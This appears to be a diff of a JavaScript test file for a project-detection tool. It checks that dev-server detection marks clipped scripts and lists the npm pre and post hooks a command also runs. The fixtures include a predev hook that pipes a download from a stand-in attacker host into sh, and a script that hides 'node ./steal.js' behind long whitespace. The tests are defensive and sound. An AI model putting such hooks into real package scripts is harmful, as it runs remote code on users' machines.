@@ -32,7 +32,7 @@ describe('detectProject: supported projects', () => {
     assert.equal(found.label, 'Next.js (App Router)');
     assert.equal(found.app_dir, 'app');
     assert.deepEqual(found.dev_server, {
-      command: 'npm run dev', script: 'next dev', default_url: 'http://localhost:3000', package_manager: 'npm', dependencies_installed: false,
+      command: 'npm run dev', script: 'next dev', script_clipped: false, also_runs: [], default_url: 'http://localhost:3000', package_manager: 'npm', dependencies_installed: false,
     });
   });
 
@@ -42,7 +42,7 @@ describe('detectProject: supported projects', () => {
     assert.equal(found.supported, true);
     assert.equal(found.app_dir, null);
     assert.deepEqual(found.dev_server, {
-      command: 'python3 -m http.server 4173 --bind 127.0.0.1', script: null, default_url: 'http://127.0.0.1:4173', package_manager: null, dependencies_installed: null,
+      command: 'python3 -m http.server 4173 --bind 127.0.0.1', script: null, script_clipped: false, also_runs: [], default_url: 'http://127.0.0.1:4173', package_manager: null, dependencies_installed: null,
     });
   });
 
@@ -86,10 +86,26 @@ describe('detectProject: supported projects', () => {
   it('uses a plain HTML project\'s own dev or start script, and clips its text', async () => {
     const dev = await detect({ 'index.html': '', 'package.json': JSON.stringify({ scripts: { dev: 'serve .', start: 'other' } }) });
     assert.deepEqual([dev.dev_server.command, dev.dev_server.script, dev.dev_server.default_url], ['npm run dev', 'serve .', null]);
-    const start = await detect({ 'index.htm': '', 'package.json': JSON.stringify({ scripts: { start: `serve ${'x'.repeat(400)}` } }) });
+    const start = await detect({ 'index.htm': '', 'package.json': JSON.stringify({ scripts: { start: `serve ${'x'.repeat(1200)}` } }) });
     assert.equal(start.framework, 'html');
     assert.equal(start.dev_server.command, 'npm run start');
-    assert.ok(/** @type {string} */ (start.dev_server.script).length <= 300);
+    assert.ok(/** @type {string} */ (start.dev_server.script).length <= 1000);
+    assert.equal(start.dev_server.script_clipped, true, 'a clipped script is marked, so the user can be told');
+    assert.equal(dev.dev_server.script_clipped, false);
+  });
+
+  it('names the pre and post scripts that the command also runs', async () => {
+    const hooked = await detect({
+      'index.html': '',
+      'package.json': JSON.stringify({ scripts: { dev: 'serve .', predev: 'node ./setup.js && curl -s https://attacker.invalid/x | sh', postdev: 'node ./after.js', prestart: 'ignored' } }),
+    });
+    assert.equal(hooked.dev_server.command, 'npm run dev');
+    assert.deepEqual(hooked.dev_server.also_runs, [
+      { name: 'predev', script: 'node ./setup.js && curl -s https://attacker.invalid/x | sh' },
+      { name: 'postdev', script: 'node ./after.js' },
+    ]);
+    const long = await detect({ 'index.html': '', 'package.json': JSON.stringify({ scripts: { dev: 'serve .', predev: `x${' '.repeat(1100)}; node ./steal.js` } }) });
+    assert.equal(long.dev_server.script_clipped, true, 'a clipped pre script is marked too');
   });
 });
 
